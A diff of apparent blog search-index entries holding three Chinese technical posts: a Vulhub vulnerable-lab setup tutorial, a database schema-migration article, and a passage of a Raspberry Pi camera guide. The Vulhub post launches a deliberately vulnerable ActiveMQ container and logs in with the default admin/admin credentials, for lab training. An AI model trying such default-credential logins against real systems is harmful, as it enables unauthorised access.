@@ -4,6 +4,807 @@
   
     
     <entry>
+      <title>Vulhub靶场搭建教程</title>
+      <link href="/posts/23e6f11f9151/"/>
+      <url>/posts/23e6f11f9151/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Vulhub靶机环境搭建"><a href="#Vulhub靶机环境搭建" class="headerlink" title="Vulhub靶机环境搭建"></a>Vulhub靶机环境搭建</h2><h3 id="Vulhub地址：-Vulhub下载地址"><a href="#Vulhub地址：-Vulhub下载地址" class="headerlink" title="Vulhub地址： Vulhub下载地址"></a>Vulhub地址： <a href="https://github.com/vulhub/vulhub/">Vulhub下载地址</a></h3><h3 id="一、所需环境"><a href="#一、所需环境" class="headerlink" title="一、所需环境"></a>一、所需环境</h3><h4 id="1、Ubuntu16-04"><a href="#1、Ubuntu16-04" class="headerlink" title="1、Ubuntu16.04"></a>1、Ubuntu16.04</h4><h4 id="2、最新版本Docker"><a href="#2、最新版本Docker" class="headerlink" title="2、最新版本Docker"></a>2、最新版本Docker</h4><h3 id="二、安装之路"><a href="#二、安装之路" class="headerlink" title="二、安装之路"></a>二、安装之路</h3><h4 id="1、下载Ubuntu16-04下载地址（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。"><a href="#1、下载Ubuntu16-04下载地址（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。" class="headerlink" title="1、下载Ubuntu16.04下载地址（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。"></a>1、下载Ubuntu16.04<a href="http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04.6-server-amd64.iso.torrent">下载地址</a>（迅雷下载64位，下载快速）PS：千万别用32位，32位环境很多64位程序都不支持。</h4><h4 id="2、VM安装Ubuntu虚拟机、"><a href="#2、VM安装Ubuntu虚拟机、" class="headerlink" title="2、VM安装Ubuntu虚拟机、"></a>2、VM安装Ubuntu虚拟机、</h4><p>选择典型安装，如下图所示：<br><img src="https://static.luozhinet.com/81/1df2d3fdd764cd9b182fb89c981e62"><br>并且提前装载好ISO，如下图所示：<br><img src="https://static.luozhinet.com/69/98f71cfaf3d219062b5d22a6f3fed0"><br>下一步配置好主机名称，账户和密码，千万别进去配置，不然巨麻烦，你如果不懂可能配置一个小时还没安装好，我这种方法，不需要进去点击任何操作，它自动把系统配置好了，10分钟左右系统就装好了，如下图所示：<br><img src="https://static.luozhinet.com/92/685a3b3039edb47ab5a67ecadab94e"><br>如下代表系统安装好了<br><img src="https://static.luozhinet.com/76/7b40fc6ce04ae57581c7504991e32f"></p><h4 id="2、Ubuntu配置"><a href="#2、Ubuntu配置" class="headerlink" title="2、Ubuntu配置"></a>2、Ubuntu配置</h4><ul><li>坑点1：Ubuntu虚拟机装好了，默认是没有SSH的，你是无法通过ssh登陆配置的。</li><li>坑点2：且默认镜像源是加载CD盘，导致你无法通过apt-get install安装openssh。</li><li>坑点3：且默认镜像源是美国的，境内的网络是无法去访问美国源下载，所以需要替换成境内镜像源，</li><li>坑点4：但是尴尬点又来了，你想把境内源（内容很多，手打不现实）通过虚拟机拷贝，发现你是无法进行拷贝操作的。</li><li>坑点5：Ubuntu默认root账户是随机密码，所以你不知道root什么密码，无法使用root账户进行安装？</li></ul><h4 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h4><p>Ubuntu国内镜像源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</span><br></pre></td></tr></table></figure><p><code>sudo apt-get install apt-transport-https ca-certificates software-properties-commonsudo add-apt-repository \</code></p><p>（1） 宿主机搞个国外的VPN（没有VPN就试试运气能不能访问把，哈.哈），让虚拟机通过NAT出去上国外的网，将&#x2F;etc&#x2F;resolv.conf的首DNS改成8.8.8.8<br><img src="https://static.luozhinet.com/51/011acd3e7e849ba7f44b6a5a8cc413"><br>（2） 将root密码进行修改<br>使用<code>sudo passwd</code>命令进行修改，连续输入三次当前账户的密码，root密码就和当前账户密码一样。<br>然后使用<code>su – root</code>切换到root账户输入root密码进行安装 ，中间必须有空格。<br><img src="https://static.luozhinet.com/14/a8e29a9835d779705f48619da1b551"><br>（3） 将默认源&#x2F;etc&#x2F;apt&#x2F;sources.list 加载CD盘的配置删除，就是这行<br><img src="https://static.luozhinet.com/de/b6aa77931885b23ff6a1723728b694"><br>（4） 删除完毕之后，更新镜像源，使用命令sudo apt-get update 进行更新<br><img src="https://static.luozhinet.com/df/8f25920b0d6422cb5c4e8b8cffc7cf"><br>（5） 更新完之后，你就可以安装opensssh了，安装opesn命令：<code>sudo apt-get install openssh-server</code>ssh安装完之后，ssh服务自动起来，就可以用xshell连接了<br><img src="https://static.luozhinet.com/f4/d57530fcb1b8b1c26760eee7bbfae6"><br>（6） ssh登陆上来，首先切换到root用户，然后将默认源进行备份，将上面的国内源进行替换。<code>cd /etc/apt/</code> 切换到镜像目录<code>mv sources.list source.yuanshi.list</code><br><img src="https://static.luozhinet.com/2f/547cc7f671da2450e99d26ed55a2b4"><br>这时，再用sz命令将本地的source.list上传到当前目录<br>（7） 输入sz命令提示不存在该命令，按照提示安装即可。<br>（8） 将默认源替换成国内源之后，随后就更新镜像源，更新命令<code>sudo apt-get update</code><br>（9） 这时，你就已经基本配置好Ubuntu环境了，接下来开始安装docker环境。</p><h4 id="3、安装docker存储库"><a href="#3、安装docker存储库" class="headerlink" title="3、安装docker存储库"></a>3、安装docker存储库</h4><p>（1）安装软件包以允许 apt 通过 HTTPS 使用存储库，输入以下命令安装软件包：<br><code>sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</code><br>（2）添加 Docker 官方的 GPG 密钥：<br><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - header</code><br>确保现在系统已经拥有密钥指纹的后八个字符串：9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 ，输入指令：<br><code>sudo apt-key fingerprint 0EBFCD88</code><br>显示结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub   4096R/0EBFCD88 2017-02-22</span><br><span class="line">      密钥指纹 = 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R/F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure><p>（3）安装docker稳定版仓库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] \</span><br><span class="line">https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure><h4 id="4、安装docker"><a href="#4、安装docker" class="headerlink" title="4、安装docker"></a>4、安装docker</h4><p>（1）更新apt镜像源索引，命令如下：<br><code>sudo apt-get update</code><br>（2）安装最新版的 Docker CE（docker社区版）<br><code>sudo apt-get install docker-ce</code><br>（3）如果不想安装最新版的 Docker，可以先查看可安装版本<br><code>apt-cache madison docker-ce</code><br>显示结果如下：<br><img src="https://static.luozhinet.com/bc/b68cb12573c920d53435e2eaa0d8fd"><br>列表的内容取决于启用了哪个存储库。第二列是Docker版本号。第三列是存储库名称，它指明了软件包来自哪个存储存储库，并通过扩展其稳定性级别。要安装特定版本，需要将本本字符串附加到包名称。<br>（4）安装指令如下：<br><code>sudo apt-get install docker-ce=&lt;VERSION&gt;</code><br>（5）通过运行 hello-world 镜像验证 Docker CE 已被正确安装<br><code>sudo docker run hello-world</code><br>若出现以下信息则表明安装成功：<br><img src="https://static.luozhinet.com/f4/2a8add59def007ecfcaa102ab683c1"></p><ul><li>安装pip，命令如下：<br><code>curl -s https://bootstrap.pypa.io/get-pip.py | python3</code></li><li>安装docker compose<br><code>pip install docker-compose</code></li></ul><h4 id="5、安装vulhub"><a href="#5、安装vulhub" class="headerlink" title="5、安装vulhub"></a>5、安装vulhub</h4><p>在根目录下新增一个文件夹，然后下载vulhub解压<br><strong>下载项目命令：</strong><code>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</code>（这里国内下载很慢，可以找我要已经下载好的Vulhub-54Mb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br></pre></td></tr></table></figure><p>如下，就代表vulhub漏洞环境下载下来了，几乎涵盖百分之80常见可验证漏洞环境。<br><img src="https://static.luozhinet.com/d7/e93be4d4f2145a80601d3682e649fc"></p><h4 id="6、Vulhub使用"><a href="#6、Vulhub使用" class="headerlink" title="6、Vulhub使用"></a>6、Vulhub使用</h4><p>这里演示activmq的漏洞cve-2016-3088为例子，Vulhub的便利就是在于不要我们去搭建环境，直接使用docker环境编译漏洞环境，就可启动漏洞环境。<br>首先进入该漏洞环境命令如下：<br><code>cd activemq/CVE-2016-3088/</code><br><img src="https://static.luozhinet.com/5f/d0d6aee76def6caaaf47bd866ff10a"><br>启动漏洞环境命令<br><code>docker-compose up -d</code><br><strong>备注：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d （推荐）或者 docker-compose build</span><br><span class="line">PS: 为什么 docker-compose build是可选的？</span><br><span class="line">docker-compose up -d运行后，会自动查找当前目录下的配置文件。如果配置文件中包含的环境均已经存在，则不会再次编译；如果配置文件中包含的环境不存在，则会自动进行编译。所以，其实 docker-compose up -d命令是包含了 docker-compose build的。</span><br><span class="line">如果更新了配置文件，你可以手工执行 docker-compose build来重新编译靶场环境。</span><br><span class="line">等待运行结束，即可自动配置好环境，然后运行</span><br></pre></td></tr></table></figure><p>下图代表启动成功<br><img src="https://static.luozhinet.com/c8/cf18b244e6c48e482a5baf646809c1"><br>使用docker ps可以看到容器已经起来，8181端口，容器ID 2bd961162b0d<br><img src="https://static.luozhinet.com/e9/b4b18a9c20ac3b26dcb3efd4954f50"><br>使用netstat也可以看到docker 代理监听端口为8161<br><img src="https://static.luozhinet.com/e3/05d34e4686a9f8825b554adeb3dd43"><br>进入容器内部看看，命令如下：<br><code>docker container exec -it 2bd961162b0d /bin/bash</code><br>下图代表我们进入activemq虚拟机了，docker就相当于时容器的宿主机。<br><img src="https://static.luozhinet.com/27/690668def708c9e254a55d90f6cfb3"><br>下图为已经运行的服务，使用http:&#x2F;&#x2F;虚拟机ip:8161<br><img src="https://static.luozhinet.com/c3/2838dfef2328694829e2524ed0da49"></p><h4 id="7、弱口令漏洞验证"><a href="#7、弱口令漏洞验证" class="headerlink" title="7、弱口令漏洞验证"></a>7、弱口令漏洞验证</h4><p>Activemq后台地址是admin，密码是admin&#x2F;admin，我们尝试登陆成功。<br><img src="https://static.luozhinet.com/42/de5c2ba05e4dd682823a276560829e"><br><img src="https://static.luozhinet.com/96/e192b1ae660dc49a8f5be74af0fa7c"><br><strong>【重要】</strong>测试完毕之后，在漏洞环境目录下使用<br><code>docker-compose down -v</code><br>即可结束服务，使环境变为初始状态。<br><img src="https://static.luozhinet.com/2e/16557916428e62172a006c715ded78"><br>其他漏洞参考vulhub的每个漏洞环境描述(README.zh-cn.md)，都已经写明漏洞利用方法，写的非常明白详细。</p><p>如cve-2016-3088，我们在github的Vulhub找到对应漏洞说明即可验证，如图<br><img src="https://static.luozhinet.com/76/338a65588733f7f93646d8d259ca54"><br>该漏洞描述链接:<a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md">链接地址</a></p><h4 id="8、Dockcer常用命令"><a href="#8、Dockcer常用命令" class="headerlink" title="8、Dockcer常用命令"></a>8、Dockcer常用命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker ps 查看当前开启了哪些docker容器</span><br><span class="line"></span><br><span class="line">进入对应容器  docker container exec -it 容器id /bin/bash </span><br><span class="line"></span><br><span class="line">docker version 检查版本信息</span><br></pre></td></tr></table></figure><h3 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h3><h4 id="1、docker安装"><a href="#1、docker安装" class="headerlink" title="1、docker安装"></a>1、docker安装</h4><p><a href="https://blog.csdn.net/diligent_lee/article/details/79098302?utm_source=blogxgwz17">https://blog.csdn.net/diligent_lee&#x2F;article&#x2F;details&#x2F;79098302?utm_source&#x3D;blogxgwz17</a></p><h4 id="2、vulhub安装"><a href="#2、vulhub安装" class="headerlink" title="2、vulhub安装"></a>2、vulhub安装</h4><p><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br><a href="https://www.freebuf.com/sectool/165062.html">https://www.freebuf.com/sectool/165062.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件 </tag>
+            
+            <tag> 对应 </tag>
+            
+            <tag> 网络 </tag>
+            
+            <tag> 程序 </tag>
+            
+            <tag> docker </tag>
+            
+            <tag> 镜像 </tag>
+            
+            <tag> 地址 </tag>
+            
+            <tag> 命令 </tag>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 后台 </tag>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> 运行 </tag>
+            
+            <tag> exec </tag>
+            
+            <tag> 安装 </tag>
+            
+            <tag> sudo </tag>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>数据库系列：高并发下的数据字段变更</title>
+      <link href="/posts/1e7ab21094ef/"/>
+      <url>/posts/1e7ab21094ef/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>经常会遇到这种情况，我们的业务已经稳定地运行一段时间了，并且流量渐渐已经上去了。这时候，却因为某些原因（比如功能调整或者业务扩展），你需要对数据表进行调整，加字段 or 修改表结构。<br>可能很多人说 alter table add column … &#x2F; alter table modify …，轻轻松松就解决了。 这样其实是有风险的<br>，对于复杂度比较高、数据量比较大的表。调整表结构、创建或删除索引、触发器，都可能引起锁表，而锁表的时长依你的数据表实际情况而定。 本人有过惨痛的教训，在一次业务上线过程中没有评估好数据规模，导致长时间业务数据写入不进来。<br>那么有什么办法对数据库的业务表进行无缝升级，让该表对用户透明无感呢？下面我们一个个来讨论。</p><h1 id="2-新增关联表"><a href="#2-新增关联表" class="headerlink" title="2 新增关联表"></a>2 新增关联表</h1><p>最简单的一种办法，把新增的字段存储在另外一张辅表上，用外键关联到主表的主键。达到动态扩展的目标。后续功能上线之后，新增的数据会存储到辅表中，主表无需调整，透明、无损。<br><img src="https://static.luozhinet.com/6d/fbc7cbea60bece9f439f0db1ca0120" alt="image"><br>存在的问题：</p><ul><li>读取数据时，联表查询效率低下，数据量越大，数据越复杂，劣势越明显。</li><li>并没有彻底的解决问题，之后有新增字段，照样面临是新增表还是修改原表的问题。即使后续新增的字段都加在辅表上，同样面临锁表的问题。</li><li>辅表的作用仅仅是解决字段新增的问题，并未解决字段更新的问题（如修改字段名、数据类型等）。</li></ul><h1 id="3-新增通用列"><a href="#3-新增通用列" class="headerlink" title="3 新增通用列"></a>3 新增通用列</h1><p>假设我们原有表结构如下，为了保障业务的持续发展，后续不间断的会有字段扩展。这时候就需要考虑增加一个可自动扩缩的通用字段。<br><img src="https://static.luozhinet.com/45/67c54ab230866712b25e8229ccc741" alt="image"><br>以MySQL为例子，5.7版本版本之后提供了Json字段类型，方便我们存储复杂的Json对象数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">use test;</span><br><span class="line">DROP TABLE IF EXISTS `t_user`;</span><br><span class="line">CREATE TABLE &quot;t_user&quot; (</span><br><span class="line">  &quot;id&quot; bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &quot;name&quot; varchar(20) NOT NULL,</span><br><span class="line">  &quot;age&quot; int(11) DEFAULT NULL,</span><br><span class="line">  &quot;address&quot; varchar(255) DEFAULT NULL,</span><br><span class="line">  &quot;sex&quot; int(11) DEFAULT &#x27;1&#x27;,</span><br><span class="line">  &quot;ext_data&quot; json DEFAULT NULL COMMENT &#x27;json字符串&#x27;,</span><br><span class="line">  PRIMARY KEY (&quot;id&quot;)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of t_user</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `t_user` VALUES (&#x27;1&#x27;, &#x27;brand&#x27;, &#x27;21&#x27;, &#x27;fuzhou&#x27;, &#x27;1&#x27;, &#x27;&#123;&quot;tel&quot;: &quot;13212345678&quot;, &quot;name&quot;: &quot;brand&quot;, &quot;address&quot;: &quot;fuzhou&quot;&#125;&#x27;);</span><br></pre></td></tr></table></figure><p>代码中 ext_data 采用Json数据类型，是一种可扩展的对象载体，存放被查询数据的信息补充。<br>同样的，MySQL提供的这种数据类型，也提供了很强大的Json函数进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,`name`,age,address FROM `t_user` WHERE json_extract(ext_data,&#x27;$.tel&#x27;) = &#x27;13212345678&#x27;;</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://static.luozhinet.com/d9/6cbe95e1930d050e714d28d7cf12e5" alt="image"></p><p>之前写MySQL系列的时候，博客园的一位读者留言要我归纳一下MySQL Json 的用法，一直没时间，大家可以看一下<a href="https://dev.mysql.com/doc/refman/8.0/en/json-functions.html" title="官网的文档">官网的文档</a>，还是比较清晰的。</p><p>Json结构一般来说是向下兼容的，所以你在设计字段扩展的时候，一般建议往前增，不建议删除旧属性。但是这也有个问题，就是业务越复杂，Json复杂度也越高，冗余属性也越多。<br>比如上文中我们的json包含三个属性，tel、name、address，之后的业务调整中，发现tel没用了，加了个age属性，那tel要不要删除？<br>有一种比较好的办法，是给表加上version属性，每个时期的业务对应一个version，每个version对应的Json数据结构也不一样。<br><img src="https://static.luozhinet.com/be/b8cad69ac4a5340703155501e21cab" alt="image"></p><p><strong>优点：</strong></p><ul><li>可以随时动态扩展属性</li><li>新旧两种数据可以同时存在</li><li>迁移数据方便，写个程序将旧版本ext的改为新版本的ext，并修改version</li></ul><p><strong>不足：</strong></p><ul><li>ext_data里的字段无法建立索引</li><li>ext_data里的key会有大量空间占用，建议key简短一些</li><li>从json中去统计某个字段数据之类的很麻烦，而且效率低。</li><li>查询相对效率较低，操作复杂。</li><li>更新Json中的某个字段效率较低，不适合存储业务逻辑复杂的数据。</li><li>统计数据复杂，建议需要做报表的数据不要存json。</li></ul><p><strong>改进：</strong></p><ul><li>如果ext里的属性有索引之类的需求，可能NoSql（如MongoDB）会更适合</li></ul><h1 id="4-新表-数据迁移"><a href="#4-新表-数据迁移" class="headerlink" title="4 新表+数据迁移"></a>4 新表+数据迁移</h1><h2 id="4-1-利用触发器进行数据迁移"><a href="#4-1-利用触发器进行数据迁移" class="headerlink" title="4.1 利用触发器进行数据迁移"></a>4.1 利用触发器进行数据迁移</h2><p><img src="https://static.luozhinet.com/4d/1693fa53c3f4ddb495bf3d894bda8f" alt="image"><br>整个步骤如下：</p><ul><li>新建一个表t_user_v1 (id, name, age, address, sex, ext_column)，包含了扩展字段 ext_column</li><li>在原有表上添加触发器，原表的DML操作（主要INSERT、UPDATE、DELETE），都会触发操作，把数据转存到新表t_user_v1中</li><li>对于旧表中原有的数据，逐步的迁移直至完成</li><li>删掉触发器，把原表移走（默认是drop掉）</li><li>把新表t_user_v1重命名（rename）成原表t_user<br>通过上述步骤，逐渐的将数据迁移到新表，并替换旧表，整个操作无需停服维护，对用业务无损</li></ul><h2 id="4-2-利用Binlog-进行数据迁移"><a href="#4-2-利用Binlog-进行数据迁移" class="headerlink" title="4.2 利用Binlog 进行数据迁移"></a>4.2 利用Binlog 进行数据迁移</h2><p>如果是MySQL数据库，可以通过复制binlog的操作进行数据迁移的，效果一样，比起触发器，更稳定一点。<br><img src="https://static.luozhinet.com/e5/53e2842d4b4d67cff0f24ec1d31970" alt="image"></p><h2 id="4-3-存在的问题"><a href="#4-3-存在的问题" class="headerlink" title="4.3 存在的问题"></a>4.3 存在的问题</h2><ul><li>操作繁琐，效率低下</li><li>数据迁移和数据表切换之间存在操作间隙，对于高并发、高频操作的数据表，还是有风险的，会引起短暂连接失效 和 数据不一致。</li><li>对于大数据表，同步时间长</li></ul><h1 id="5-字段预留"><a href="#5-字段预留" class="headerlink" title="5 字段预留"></a>5 字段预留</h1><p>预留字段 和 字段与表格名称映射的办法。<br><img src="https://static.luozhinet.com/64/bd771ae32f415decdfcd0b2b23fe2d" alt="image"></p><h2 id="5-1-存在的问题"><a href="#5-1-存在的问题" class="headerlink" title="5.1 存在的问题"></a>5.1 存在的问题</h2><ul><li>同样的，查询效率低</li><li>预设存在未知数，可能存在预设的字段不够，也可能存在空间冗余</li><li>冗余过多的空子字段，对存储空间的占用和性能的提升存在阻碍。</li><li>该方法还是比较笨的，不适合程序员思维</li></ul><h1 id="6-多主模式和分级更新"><a href="#6-多主模式和分级更新" class="headerlink" title="6 多主模式和分级更新"></a>6 多主模式和分级更新</h1><p>如果业务流量比较小，可以直接在表上进行字段新增或者修改，短暂的写锁是可以承受的。但如果是高并发、集群化、分布式的系统，则从数据层面上就应该进行主从或者分库分表治理。<br>以下是典型的的多主要模式下，进行数据库表结构升级的过程。<br><img src="https://static.luozhinet.com/e2/69857d27bf91c70b204a5878f2325e" alt="image"></p><ol><li>正常两主模式下，主主同步，可以使用DBproxy、Fabric 等数据中间件做负载均衡，也可以自己定义一些负载策略，比如 Range、Hash。</li><li>修改配置，让流量都切到其中一台上，然后对另外一台进行数据表升级（比如切DB1，只使用DB2）。切记在业务低峰期进行，避免流量过大导致另外一个数据库实例负载过大而挂起。</li><li>轮流这个操作，但是这时候不需要再升级DB2了，因为是主主同步。DB instance 1 已经是新的表结构了，这时候会连同架构包括数据一起更新到 DB2 上。</li><li>等两个数据库实例都一致了，修改配置，重设两个数据库实例的负载，恢复到之前的状态。</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> json </tag>
+            
+            <tag> 对应 </tag>
+            
+            <tag> 数据库 </tag>
+            
+            <tag> 对象 </tag>
+            
+            <tag> 程序 </tag>
+            
+            <tag> 运行 </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 无损 </tag>
+            
+            <tag> 空间 </tag>
+            
+            <tag> 字段 </tag>
+            
+            <tag> 数据 </tag>
+            
+            <tag> 迁移 </tag>
+            
+            <tag> t_user </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>用树莓派USB摄像头做个监控</title>
+      <link href="/posts/c7431729e0c0/"/>
+      <url>/posts/c7431729e0c0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h2><blockquote><p>看着阴暗的角落里吃灰噎到嗓子眼的树莓派，一起陪伴的时光历历在目，往事逐渐涌上心头，每每触及此处，内心总会升腾起阵阵怜悯之情…</p></blockquote><p>我这有两个设备，一个是积灰已久的树莓派，另一个是积灰已久的USB摄像头。</p><p>我们今天用这两个设备做一个拍摄监控方案（非视频录制），然后将拍摄好的图片合成视频进行观看。</p><p>主要用到的技术有：树莓派&#x2F;linux操作，crontab，python，ffmpeg。</p><h2 id="【系列目录】"><a href="#【系列目录】" class="headerlink" title="【系列目录】"></a>【系列目录】</h2><ol><li>树莓派驱动usb摄像头（非官方摄像头模块）</li><li>树莓派加载外接USB硬盘</li><li>树莓派拍摄获取素材程序</li><li>树莓派定时任务编写</li><li>将素材图片合成视频</li></ol><h2 id="【实现过程】"><a href="#【实现过程】" class="headerlink" title="【实现过程】"></a>【实现过程】</h2><h4 id="树莓派驱动usb摄像头（非官方摄像头模块）"><a href="#树莓派驱动usb摄像头（非官方摄像头模块）" class="headerlink" title="树莓派驱动usb摄像头（非官方摄像头模块）"></a>树莓派驱动usb摄像头（非官方摄像头模块）</h4><p>首先我们要保证树莓派可以识别usb摄像头设备，使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到usb设备列表第一个即 <em>海康威视1080p</em> usb摄像头，说明我们的摄像头设备被正确识别，如果无法识别，则要排除设备故障或想办法安装设备驱动程序。</p><p>我们使用fswebcam应用来驱动usb摄像头模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fswebcam</span><br><span class="line">sudo apt-get install mplayer</span><br></pre></td></tr></table></figure><p>简单输入拍照命令测试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fswebcam -r 1920*1080 --delay 3 --skip 10 1.jpg</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/68/d30bcb84ecd167082288728939949c" alt="image"></p><p><img src="https://static.luozhinet.com/06/c31781a6cbc5d1d8b0454655251d21" alt="image"></p><p>我们把树莓派上的 1.jpg 下载下来进行查看，成功拍摄到了画面！</p><p><img src="https://static.luozhinet.com/5e/8b6bcf5635c27baafcab938422f312" alt="image"></p><p>我们在使用fswebcam时，增加了几个参数，下面介绍这几个参数的作用：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 1920*1080</td><td>拍摄图片分辨率</td></tr><tr><td>--delay 3</td><td>延时3s后拍摄（给摄像头自动对焦的时间，否则会模糊，这个经常拍照的可以理解吧）</td></tr><tr><td>--skip 10</td><td>作用同上，拍摄时其实会拍摄好多帧，我们跳过前10帧以保证清晰度</td></tr></tbody></table><h4 id="树莓派加载外接USB硬盘"><a href="#树莓派加载外接USB硬盘" class="headerlink" title="树莓派加载外接USB硬盘"></a>树莓派加载外接USB硬盘</h4><p>我们计划编写一个程序来长时间捕捉摄像头画面，那么就需要一个比较大的存储空间来存放我们拍摄的图片，我们从小角落找到一个同样“积灰已久”的固态硬盘。</p><p>windows下使用过的硬盘，推荐格式化成<em>FAT32</em>格式，该格式是兼容Linux系统文件格式的，NTFS格式兼容性不是特别好，可能读写会出问题。</p><blockquote><p>当然直接用linux fdisk命令格式化成 ext2&#x2F;3&#x2F;4 也是可以的，但是后续在windows环境下读写又是新问题，如果硬盘不是准备永久挂载在linux系统下使用，还是建议用<em>FAT32</em>格式使用。</p></blockquote><blockquote><p>windows10&#x2F;11 下已经不提供格式成 <em>FAT32</em> 